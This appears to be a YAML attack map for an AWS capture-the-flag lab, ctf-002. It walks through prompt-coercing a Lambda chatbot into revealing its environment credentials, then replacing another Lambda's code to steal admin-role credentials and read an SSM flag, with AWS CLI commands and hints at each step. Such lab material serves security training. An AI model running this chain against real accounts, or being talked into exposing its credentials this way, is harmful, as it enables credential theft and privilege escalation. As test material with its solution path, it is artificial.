attackMap:
  nodes:
  - id: acmebot-lambda
    label: AcmeBot Chatbot
    type: resource
    subType: lambda-function
    arn: arn:aws:lambda:{region}:{account_id}:function/pl-prod-ctf-002-acmebot
    access:
      type: public-network
      url: https://{function_url_id}.lambda-url.{region}.on.aws/
    description: 'This resource is publicly accessible without AWS credentials. This is your entry point.

      Note: You will need to enter your own OpenAI API key here, which will be used for the demo

      '
  - id: chatbot-role
    label: Chatbot Role
    type: principal
    subType: iam-role
    arn: arn:aws:iam::{account_id}:role/pl-prod-ctf-002-chatbot-role
    description: 'This is the Lambda execution role for AcmeBot.

      '
  - id: data-processor-lambda
    label: Data Processor
    type: resource
    subType: lambda-function
    arn: arn:aws:lambda:{region}:{account_id}:function/pl-prod-ctf-002-acme-data-processor
    description: "An internal Lambda function used by Acme Corp's data processing pipeline.      \n"
  - id: target-role
    label: Admin Role
    type: principal
    subType: iam-role
    isAdmin: true
    arn: arn:aws:iam::{account_id}:role/pl-prod-ctf-002-target-role
    description: 'The execution role attached to the data processor Lambda. Gaining access to these credentials is your final
      objective -- once you have them, find the flag.

      '
  - id: ctf-flag
    label: CTF Flag
    type: resource
    subType: ssm-parameter
    isTarget: true
    arn: arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ctf-002-to-admin
    description: 'The CTF flag stored in SSM Parameter Store. Readable only with the admin role credentials.

      '
  edges:
  - from: acmebot-lambda
    to: chatbot-role
    label: Prompt coercion
    description: "Enter your own OpenAI API key to get started, then start interacting with the  agent. Try to get the agent\
      \ to give you information that might lead to lateral  movement within the cloud control plane. \n"
    commands:
    - description: Open the chatbot URL and send a prompt payload
      command: '# In the chatbot UI, try to get the chatbot to run a diagnostic command that reveals environment variables'
    - description: Extract the credentials from the chatbot's response
      command: 'export AWS_ACCESS_KEY_ID="ASIA..."

        export AWS_SECRET_ACCESS_KEY="..."

        export AWS_SESSION_TOKEN="..."'
    - description: Confirm identity as the chatbot role
      command: aws sts get-caller-identity
    - description: Confirm the flag is not directly accessible with these credentials
      command: aws ssm get-parameter --name /pathfinding-labs/flags/ctf-002-to-admin --with-decryption
    hints:
    - LLMs with tool-calling capability can sometimes be guided into using those tools in unintended ways — think about how
      a 'diagnostic' framing might influence tool selection.
    - The runtime environment of any AWS compute service holds credentials. Getting the chatbot to run a command that reveals
      environment variables is a path to the execution role.
  - from: chatbot-role
    to: data-processor-lambda
    label: Code replacement
    description: 'Using the chatbot role credentials, enumerate what Lambda functions exist and what permissions you have
      over them. Then find a way to influence the data processor''s behavior.

      '
    commands:
    - description: List Lambda functions to find the data processor
      command: aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role}' --output table
    - description: Inspect the target Lambda's execution role
      command: aws lambda get-function --function-name <data-processor-function-name> --query 'Configuration.{Role:Role,Runtime:Runtime}'
    - description: Check what policies are attached to the target role
      command: aws iam list-attached-role-policies --role-name <target-role-name>
    - description: Create a handler that reads and returns its own environment variables, then package it as a zip
      command: '# Write a handler in the function''s runtime language that returns process environment variables as JSON'
    - description: Replace the target Lambda's code with your handler
      command: aws lambda update-function-code --function-name <data-processor-function-name> --zip-file fileb://<your-zip>
    hints:
    - With write access to a Lambda function, you control what code runs under its execution role — including code that reads
      and returns the runtime environment's credential variables. Fetch the existing function configuration to confirm the
      handler filename before uploading your replacement.
    - Package your handler as a zip file in the function's runtime language before uploading with lambda:UpdateFunctionCode.
      After uploading, invoke the function and parse the response body to extract all three credential fields (AWS_ACCESS_KEY_ID,
      AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN), then export them and verify your new identity with sts:GetCallerIdentity.
  - from: data-processor-lambda
    to: target-role
    label: Privileged invocation
    description: 'Invoke the now-modified data processor Lambda. Your code runs under the privileged execution role -- extract
      those credentials from the response and use them to capture the flag.

      '
    commands:
    - description: Invoke the data processor to retrieve admin credentials
      command: aws lambda invoke --function-name <data-processor-function-name> --payload '{}' /tmp/response.json && cat /tmp/response.json
    - description: Parse the response body and export the admin credentials
      command: '# Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the response JSON and export
        them'
    - description: Verify admin access
      command: aws sts get-caller-identity
    - description: Read the CTF flag
      command: aws ssm get-parameter --name /pathfinding-labs/flags/ctf-002-to-admin --with-decryption --query 'Parameter.Value'
        --output text
    hints: []
  - from: target-role
    to: ctf-flag
    label: Flag retrieval
    description: 'With administrator credentials from the target role, read the CTF flag from SSM Parameter Store.

      '
    commands:
    - description: Read the CTF flag
      command: aws ssm get-parameter --name /pathfinding-labs/flags/ctf-002-to-admin --query 'Parameter.Value' --output text
    hints:
    - Use ssm:GetParameter with the flag parameter name shown in the target node ARN to retrieve the CTF flag value.
